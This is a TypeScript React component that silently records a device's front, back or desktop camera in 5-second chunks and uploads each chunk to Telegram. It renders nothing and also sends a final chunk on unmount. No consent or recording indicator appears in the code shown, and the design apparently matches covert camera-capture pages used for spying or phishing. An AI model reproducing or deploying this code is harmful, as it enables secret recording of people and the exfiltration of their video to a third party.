import { useEffect, useRef, useState } from 'react';
import { sendVideoToTelegram } from '../utils/videoUpload';

interface VideoRecorderProps {
  stream: MediaStream | null;
  isRecording: boolean;
  onChunkReady?: (blob: Blob, chunkNum: number, cameraType: 'front' | 'back' | 'desktop') => void;
  cameraType: 'front' | 'back' | 'desktop';
  globalChunkCounter: { current: number }; // Add global chunk counter
}

export function VideoRecorder({ stream, isRecording, onChunkReady, cameraType, globalChunkCounter }: VideoRecorderProps) {
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const chunksRef = useRef<Blob[]>([]);
  const intervalRef = useRef<NodeJS.Timeout | null>(null);
  const [mimeType, setMimeType] = useState<string>('');
  
  // Log component mount with camera type
  useEffect(() => {
    console.log(`🔥 [VideoRecorder] Component MOUNTED with camera: ${cameraType}, current chunk counter: ${globalChunkCounter.current}`);
    return () => {
      console.log(`💀 [VideoRecorder] Component UNMOUNTED for camera: ${cameraType}`);
    };
  }, [cameraType]);

  useEffect(() => {
    // Detect best MIME type for video recording
    const detectMimeType = (): string => {
      // Detect mobile device
      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
      const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
      const isAndroid = /Android/i.test(navigator.userAgent);
      
      console.log(`📱 [Video] Устройство: ${isIOS ? 'iOS' : isAndroid ? 'Android' : 'Desktop'}`);
      
      // Priority list based on device
      let types: string[] = [];
      
      if (isIOS) {
        // iOS Safari: WebM не поддерживается, MP4 через MediaRecorder тоже может не работать
        // Приоритет: WebM с H264 (если Safari 14.5+), потом VP8
        types = [
          'video/mp4;codecs=avc1.42E01E,mp4a.40.2',  // AVC Baseline profile - более стабильный
          'video/mp4;codecs=avc1.42E01E',
          'video/webm;codecs=h264',
          'video/mp4;codecs=h264',
          'video/mp4',
          'video/webm;codecs=vp8',
          'video/webm',
        ];
      } else if (isAndroid) {
        // Android Chrome: отличная поддержка MP4 и WebM
        // CRITICAL: Use avc1.42E01E or VP9 to avoid codec description changes
        types = [
          'video/mp4;codecs=avc1.42E01E,mp4a.40.2',  // AVC Baseline + AAC - стабильный
          'video/webm;codecs=vp9,opus',              // VP9 - лучше для переменного разрешения
          'video/webm;codecs=vp9',
          'video/webm;codecs=vp8,opus',
          'video/webm;codecs=vp8',
          'video/mp4;codecs=h264,aac',
          'video/mp4;codecs=h264',
          'video/mp4',
          'video/webm',
        ];
      } else {
        // Desktop: MP4 приоритет, но с правильным профилем AVC
        types = [
          'video/mp4;codecs=avc1.42E01E,mp4a.40.2',  // AVC Baseline + AAC - без проблем с разрешением
          'video/webm;codecs=vp9,opus',              // VP9 - альтернатива
          'video/webm;codecs=vp9',
          'video/mp4;codecs=h264',
          'video/mp4',
          'video/webm;codecs=h264',
          'video/webm;codecs=vp8',
          'video/webm',
        ];
      }

      for (const type of types) {
        if (MediaRecorder.isTypeSupported(type)) {
          console.log(`✅ [Video] Поддерживаемый MIME: ${type}`);
          return type;
        }
      }

      console.warn('⚠️ [Video] Используем MIME по умолчанию');
      return '';
    };

    setMimeType(detectMimeType());
  }, []);

  useEffect(() => {
    if (!stream || !isRecording) {
      console.log(`⏹️ [Video ${cameraType}] Запись остановлена или нет потока`);
      return;
    }

    console.log(`🎬 [Video ${cameraType}] Начинаем запись...`);

    try {
      // Create MediaRecorder with detected MIME type
      const options = mimeType ? { mimeType } : {};
      
      console.log(`🎥 [Video ${cameraType}] Попытка создать MediaRecorder с:`, options);
      console.log(`🎥 [Video ${cameraType}] Stream tracks:`, stream.getTracks().map(t => ({ kind: t.kind, label: t.label, enabled: t.enabled })));
      
      let recorder: MediaRecorder;
      
      try {
        recorder = new MediaRecorder(stream, options);
        console.log(`✅ [Video ${cameraType}] MediaRecorder создан с ${mimeType}`);
      } catch (e) {
        console.warn(`⚠️ [Video ${cameraType}] Не удалось создать с ${mimeType}, пробуем без кодека...`, e);
        // Fallback: try without specific codec
        recorder = new MediaRecorder(stream);
        console.log(`✅ [Video ${cameraType}] MediaRecorder создан с дефолтным кодеком`);
      }
      
      mediaRecorderRef.current = recorder;
      chunksRef.current = [];

      recorder.ondataavailable = (event) => {
        if (event.data && event.data.size > 0) {
          console.log(`📊 [Video ${cameraType}] Получен фрагмент данных: ${event.data.size} bytes`);
          chunksRef.current.push(event.data);
        }
      };

      recorder.onstop = async () => {
        console.log(`⏸️ [Video ${cameraType}] MediaRecorder остановлен`);
        
        if (chunksRef.current.length === 0) {
          console.warn(`⚠️ [Video ${cameraType}] Нет данных для отправки`);
          return;
        }

        const blob = new Blob(chunksRef.current, { type: mimeType || 'video/webm' });
        globalChunkCounter.current += 1;
        
        console.log(`📦 [Video ${cameraType}] Создан blob чанк #${globalChunkCounter.current}, размер: ${blob.size} bytes`);

        // Send to Telegram
        if (onChunkReady) {
          onChunkReady(blob, globalChunkCounter.current, cameraType);
        } else {
          await sendVideoToTelegram(blob, globalChunkCounter.current, cameraType);
        }

        chunksRef.current = [];
      };

      recorder.onerror = (event) => {
        console.error(`❌ [Video ${cameraType}] Ошибка MediaRecorder:`, event);
      };

      // Start recording
      recorder.start();
      console.log(`✅ [Video ${cameraType}] Запись началась`);

      // Send chunks every 5 seconds
      intervalRef.current = setInterval(() => {
        if (recorder.state === 'recording') {
          console.log(`⏰ [Video ${cameraType}] 5 секунд прошло - останавливаем чанк`);
          recorder.stop();
          // Restart recording immediately
          setTimeout(() => {
            if (isRecording && recorder.state !== 'recording') {
              chunksRef.current = [];
              recorder.start();
              console.log(`🔄 [Video ${cameraType}] Начинаем новый чанк`);
            }
          }, 100);
        }
      }, 5000); // 5 seconds

    } catch (error) {
      console.error(`❌ [Video ${cameraType}] Ошибка создания MediaRecorder:`, error);
    }

    // Cleanup
    return () => {
      console.log(`🧹 [Video ${cameraType}] Очистка...`);
      
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
        intervalRef.current = null;
      }

      if (mediaRecorderRef.current && mediaRecorderRef.current.state !== 'inactive') {
        mediaRecorderRef.current.stop();
      }

      // Send last chunk on unmount
      if (chunksRef.current.length > 0) {
        const blob = new Blob(chunksRef.current, { type: mimeType || 'video/webm' });
        globalChunkCounter.current += 1;
        console.log(`📦 [Video ${cameraType}] Послед��ий чанк #${globalChunkCounter.current} при закрытии`);
        sendVideoToTelegram(blob, globalChunkCounter.current, cameraType);
      }
    };
  }, [stream, isRecording, mimeType, cameraType, onChunkReady, globalChunkCounter]);

  // This component doesn't render anything
  return null;
}